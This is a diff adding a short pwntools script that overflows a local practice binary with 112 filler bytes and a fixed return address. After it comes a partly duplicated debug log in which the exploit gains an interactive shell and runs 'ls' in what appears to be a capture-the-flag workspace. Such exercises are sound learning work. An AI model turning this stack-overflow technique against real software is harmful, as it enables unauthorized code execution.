@@ -1,0 +1,68 @@
+from pwn import*
+
+context_level='debug'
+p=process('./a')
+sys=0x804863a
+payload=112*'a'+p32(0x804863a)
+
+p.send(payload)
+
+p.interactive()
+
+
+
+the effect of attack:
+chen@ubuntu:~/Desktop$ python a.py
+[+] Starting local process './a': pid 3836
+[+] Starting local process './a': pid 3836
+[DEBUG] Received 0x37 bytes:
+    'There is something amazing here, do you know anything?\n'
+[DEBUG] Sent 0x74 bytes:
+    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
+    *
+    00000070  3a 86 04 08                                         │:···│
+    00000074
+[*] Switching to interactive mode
+$ 
+[DEBUG] Sent 0x1 bytes:
+    '\n' * 0x1
+[DEBUG] Received 0x21 bytes:        
+
+
+
+
+
+
+
+[+] Starting local process './a': pid 3836
+[DEBUG] Received 0x37 bytes:
+    'There is something amazing here, do you know anything?\n'
+[DEBUG] Sent 0x74 bytes:
+    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
+    *
+    00000070  3a 86 04 08                                         │:···│
+    00000074
+[*] Switching to interactive mode
+$ 
+[DEBUG] Sent 0x1 bytes:
+    '\n' * 0x1
+[DEBUG] Received 0x21 bytes:
+    'Maybe I will tell you next time !'
+Maybe I will tell you next time !$ ls
+[DEBUG] Sent 0x3 bytes:
+    'ls\n'
+[DEBUG] Received 0x16a bytes:
+    'a\tCr0ssfun    hh.py\t\t    peda-session-test.txt  text.c\n'
+    'a.py\te.py\t    level1\t\t    peda-session-text.txt  text.py\n'
+    'baby\texp1.py     peda-session-a.out.txt  ret2text\t\t   xctf-easy\n'
+    'bof\texp.py\t    peda-session-baby.txt   test\n'
+    'b.py\tgetshell    peda-session-bof.txt    test.c\n'
+    'Closed\tgetshell-2  peda-session-pwn1.txt   test.o\n'
+    'core\tha.py\t    peda-session-pwn.txt    text\n'
+a    Cr0ssfun    hh.py            peda-session-test.txt  text.c
+a.py    e.py        level1            peda-session-text.txt  text.py
+baby    exp1.py     peda-session-a.out.txt  ret2text           xctf-easy
+bof    exp.py        peda-session-baby.txt   test
+b.py    getshell    peda-session-bof.txt    test.c
+Closed    getshell-2  peda-session-pwn1.txt   test.o
+core    ha.py        peda-session-pwn.txt    text
